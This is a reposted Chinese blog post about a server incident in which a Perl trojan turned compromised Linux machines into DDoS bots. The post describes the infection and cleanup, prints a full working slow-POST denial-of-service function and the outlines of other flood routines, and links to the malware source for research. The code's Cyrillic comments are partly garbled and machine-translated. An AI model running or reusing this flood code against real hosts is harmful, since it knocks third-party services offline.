---
date: '2012-04-22 16:04'
layout: post
slug: zt-an-experience-of-server-anti-ddos
title: "[ZT]记一次运维，一个 Linux 木马"
description: ""
category:
tags: [ddos, server]
---

http://www.lovelucy.info/an-experience-of-server-anti-ddos.html<br>
2012-04-22 16:04	| 25 次围观<br>
<font color="navy">嘛，新平台上的第一篇新帖子……</font>

* * *

上个月数据中心的多台服务器接连被人挂马，又有客户的网站被 DDOS，公司的运维整个都处于一种被打了鸡血的亢奋状态，连我手上的项目都被部门老大停了，调去帮运维。第一次见到 Linux 下面的木马，突然想起来，还是值得记录一下。

分析日志发现 Attacker 应该是通过某种途径获得了客户的后台密码，然后利用控制面板的漏洞，上传了压缩包里的 `falabiya.cgi` 并运行。这样会生成 `.X11-unix` 文件（其实就是 falabiya 那一段 `base64_decode`）， `.X11-unix`即具体的后门程序。

信安专业的 Felix021 和芒果师兄都对这个案例表示出了兴趣，于是我分别和他们分析了一下。这是一段 perl 脚本，写得十分精妙。具体功能就是拿我们的服务器做肉鸡，监听端口获取指令，向指定地址发送数据，从而实行 DDOS 攻击。代码内置了几乎所有浏览器的 UA 字符串，每次都随机抽取其中一个，伪装为正常访问。genGarbage、tcp flood、udp flood、slow get/post 等各种 DDOS 方式均有实现，特别是 sendSlowPostRequest 这个方法，实在太贱了，一点点地发，对方必须 hold 住资源等你发完。。短短数百行代码，却对各种错误异常处理得十分仔细，必然出自高人之手。注释里有些不能识别的字符，也不知道是什么编码，无法推断是哪个国家的黑客写的。。

<font color="navy">
Galaxy看到注释中有<code>#id3|slowpost|ya3.ru|3128|/index.html</code>，就猜到是俄语。到EditPlus中翻了半天，找到<code>Ukrainian (MAC) 10017</code>，解出来一看，果然是。<br>
话说，俄语的学名是“乌克兰语” <font style="font-family: Arial Unicode MS, Lucida Sans Unicode;">[ukrɑˈjɪɲsʲkɑ ˈmɔwɑ] </font>么？
</font>

{% highlight perl %}
sub sendSlowPostRequest {
	my $host = $_[0];
	my $port = $_[1];
	my $path = $_[2];
	my $contentLen = $_[3];
	my $chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+|\=-~`1234567890";

	print "start\n";

	socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
	$iaddr = inet_aton($host);
	$paddr = sockaddr_in($port, $iaddr);
	connect(SOCK, $paddr);

	#send header
	send (SOCK, "POST ".$path." HTTP/1.1\r\n", 0);
	send (SOCK, "Host: $host\r\n", 0);
	send (SOCK, "User-Agent: $ua\r\n", 0);
	send (SOCK, "Content-type: application/x-www-form-urlencoded\r\n", 0);
	send (SOCK, "Content-length: $contentLen\r\n", 0);
	send (SOCK, "\r\n", 0);

	#send body
	for my $i (1..$contentLen){
		my $symbol = substr $chars, int rand length($chars), 1;
		print "$symbol ";
		send (SOCK, $symbol, 0);
		sleep 3;
	}
	send (SOCK, "\r\n", 0);
	close(SOCK);
	print "end\n";
}
{% endhighlight %}

后来我们清理掉了所有木马，限制脚本运行，配置防火墙阻止向外发送异常数据。至于我们自己被 DDOS 攻击，也是配防火墙搞定，那几台设备好几百万，还是相当给力的。因为来自中国的攻击很多，Boss 一直对内地黑客十分“敬仰”，要我介绍几个给他认识。。其实我是了解国内那些所谓的“黑客”的，不得已只好把也是武大信安毕业后来去中科院的 LC 拉来……后来 Boss 还跑去北京找绿盟谈过合作，据说他家要上市了。

代码请[猛戳这里](/assets/wp-uploads/2012/peach.20120228.zip "http://host-for-download.googlecode.com/files/peach.20120228.zip")下载。有任何研究发现，欢迎分享。

* * *

<font color="navy">Galaxy随手喂Google翻译了几句：</font>

{% highlight perl %}
#хттп √≈“ атака (парамерты : хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами)
# Http √ ≈ "attack (paramerty: host, port, path to the script, the time ¤ ¤ timeout between requests)
sub sendGetRequest {
	my $host = $_[0];
	my $port = $_[1];
	my $path = $_[2];

#хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами, текстовый буффер дл¤ отсылки в теле ѕќ—“а
# Host, port, path to the script, the time ¤ ¤ timeout between requests, the text buffer dl ¤ ѕќ references in the body, "a
sub sendPostRequest {
	my $host = $_[0];
	my $port = $_[1];
	my $path = $_[2];
	my $content = $_[3];

# HTTP GET (парамерты : хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами)
# HTTP GET (paramerty: host, port, path to the script, the time ¤ ¤ timeout between requests)
sub attackHttpGet {
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $path = $_[2];
		my $sleep = $_[3];
		my $duration = $_[4];

# ѕќ—“ атака (парамерты : хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами, текстовый буффер дл¤ отсылки в теле ѕќ—“а)
# Ѕќ-"attack (paramerty: host, port, path to the script, the time ¤ ¤ timeout between requests, the text buffer dl ¤ ѕќ references in the body-" a)
sub attackHttpPost {
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $path = $_[2];
		my $sleep = $_[3];
		my $content = $_[4];
		my $duration = $_[5];

# TROLL атака (парамерты : хост, порт, кол-во коннектов на 1 поток, слип). если порт 0, то порт рандом.
# TROLL attack (paramerty: host, port, number of connections in a thread, slip). if the port is 0, the random port.
sub attackTroll {
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $connects = $_[2];
		my $sleep = $_[3];
		my $duration = $_[4];

# TCP атака. тоже что и тролл, но с посылкой мусора в порт после коннекта. доп.параметр : максимальный размер мусорного реквеста.
# TCP attack. Same as trolley buses, but with sending debris into port after connect. dop.parametr: the maximum size of a garbage rekvesta.
sub attackTcpTroll {
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $connects = $_[2];
		my $maxLen = $_[3];
		my $duration = $_[4];

# HTTP from IRC (парамерты : хост, длительность)
# HTTP from IRC (paramerty: host, duration)
sub attackHttpFlood {
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $duration = $_[1];
{% endhighlight %}
